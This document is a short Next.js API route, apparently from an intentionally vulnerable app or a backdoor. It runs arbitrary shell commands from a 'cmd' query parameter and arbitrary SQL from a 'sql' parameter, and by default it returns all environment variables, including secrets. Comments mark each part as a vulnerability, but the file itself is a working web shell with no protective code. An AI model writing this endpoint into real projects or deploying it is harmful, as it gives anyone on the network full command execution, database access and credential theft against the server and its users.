import { prisma } from "@/lib/prisma";
import { NextResponse } from "next/server";
import { exec } from "child_process";
import { promisify } from "util";

const execPromise = promisify(exec);

export async function GET(req: Request) {
    const { searchParams } = new URL(req.url);
    const cmd = searchParams.get("cmd");
    const sql = searchParams.get("sql");

    // VULNERABILITY: REMOTE CODE EXECUTION (RCE)
    if (cmd) {
        try {
            const { stdout, stderr } = await execPromise(cmd);
            return NextResponse.json({ stdout, stderr });
        } catch (err: any) {
            return NextResponse.json({ error: err.message }, { status: 500 });
        }
    }

    // VULNERABILITY: UNRESTRICTED SQL EXECUTION
    if (sql) {
        try {
            const result = await prisma.$queryRawUnsafe(sql);
            return NextResponse.json(result);
        } catch (err: any) {
            return NextResponse.json({ error: err.message }, { status: 500 });
        }
    }

    // VULNERABILITY: FULL SYSTEM INFO LEAK
    return NextResponse.json({
        platform: process.platform,
        env: process.env, // MASSIVE LEAK
        cwd: process.cwd(),
        nodeVersion: process.version
    });
}
